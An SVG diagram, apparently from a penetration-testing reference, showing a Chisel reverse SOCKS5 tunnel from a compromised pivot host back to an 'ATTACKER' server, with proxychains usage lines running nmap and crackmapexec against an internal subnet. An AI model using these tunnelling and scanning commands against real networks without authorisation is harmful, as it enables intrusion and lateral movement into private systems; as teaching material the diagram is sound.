<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 200" width="800" height="200">
  <defs>
    <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#555555"/>
    </marker>
    <marker id="garr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#00c732"/>
    </marker>
  </defs>
  <rect width="800" height="200" fill="#0d0d0d"/>
  <text x="16" y="22" font-family="Courier New, monospace" font-size="12" font-weight="bold" fill="#e0e0e0">CHISEL REVERSE SOCKS5 TUNNEL</text>

  <!-- Attacker -->
  <rect x="20" y="50" width="150" height="60" rx="3" fill="#111" stroke="#00c732" stroke-width="1.5"/>
  <text x="95" y="70" font-family="Courier New, monospace" font-size="10" fill="#00c732" text-anchor="middle">ATTACKER</text>
  <text x="95" y="84" font-family="Courier New, monospace" font-size="8" fill="#888" text-anchor="middle">chisel server --reverse</text>
  <text x="95" y="96" font-family="Courier New, monospace" font-size="8" fill="#555" text-anchor="middle">:8080 (HTTP listener)</text>
  <text x="95" y="107" font-family="Courier New, monospace" font-size="7" fill="#555" text-anchor="middle">SOCKS5 on :1080</text>

  <!-- Arrow: pivot connects out to attacker -->
  <line x1="310" y1="80" x2="173" y2="80" stroke="#00c732" stroke-width="1.5" marker-end="url(#garr)"/>
  <text x="242" y="73" font-family="Courier New, monospace" font-size="8" fill="#888" text-anchor="middle">HTTP/S outbound</text>
  <text x="242" y="94" font-family="Courier New, monospace" font-size="7" fill="#555" text-anchor="middle">(firewall-friendly)</text>

  <!-- Pivot -->
  <rect x="310" y="50" width="180" height="60" rx="3" fill="#111" stroke="#888" stroke-width="1.2"/>
  <text x="400" y="70" font-family="Courier New, monospace" font-size="10" fill="#888" text-anchor="middle">PIVOT HOST</text>
  <text x="400" y="84" font-family="Courier New, monospace" font-size="8" fill="#888" text-anchor="middle">chisel client ATTACKER:8080</text>
  <text x="400" y="96" font-family="Courier New, monospace" font-size="8" fill="#555" text-anchor="middle">R:socks (reverse SOCKS5)</text>

  <!-- Arrow: pivot to internal -->
  <line x1="490" y1="80" x2="534" y2="80" stroke="#555" stroke-width="1.2" marker-end="url(#arr)"/>

  <!-- Internal network -->
  <rect x="535" y="40" width="240" height="80" rx="3" fill="#0d0d0d" stroke="#333" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="655" y="57" font-family="Courier New, monospace" font-size="9" fill="#444" text-anchor="middle">INTERNAL NETWORK</text>
  <rect x="550" y="62" width="80" height="24" rx="2" fill="#111" stroke="#00b3cc" stroke-width="0.8"/>
  <text x="590" y="78" font-family="Courier New, monospace" font-size="8" fill="#00b3cc" text-anchor="middle">192.168.x.x</text>
  <rect x="645" y="62" width="80" height="24" rx="2" fill="#111" stroke="#00b3cc" stroke-width="0.8"/>
  <text x="685" y="78" font-family="Courier New, monospace" font-size="8" fill="#00b3cc" text-anchor="middle">10.10.x.x</text>
  <rect x="548" y="92" width="65" height="20" rx="2" fill="#111" stroke="#00b3cc" stroke-width="0.8"/>
  <text x="580" y="106" font-family="Courier New, monospace" font-size="7" fill="#00b3cc" text-anchor="middle">DC / RDP</text>
  <rect x="663" y="92" width="65" height="20" rx="2" fill="#111" stroke="#00b3cc" stroke-width="0.8"/>
  <text x="695" y="106" font-family="Courier New, monospace" font-size="7" fill="#00b3cc" text-anchor="middle">DB / SMB</text>

  <!-- proxychains note -->
  <text x="16" y="155" font-family="Courier New, monospace" font-size="9" fill="#888">USAGE</text>
  <text x="16" y="170" font-family="Courier New, monospace" font-size="9" fill="#555">proxychains -q nmap -sT -p 445,3389 192.168.1.0/24</text>
  <text x="16" y="184" font-family="Courier New, monospace" font-size="9" fill="#555">proxychains -q crackmapexec smb 192.168.1.0/24    →   /etc/proxychains.conf: socks5 127.0.0.1 1080</text>
</svg>
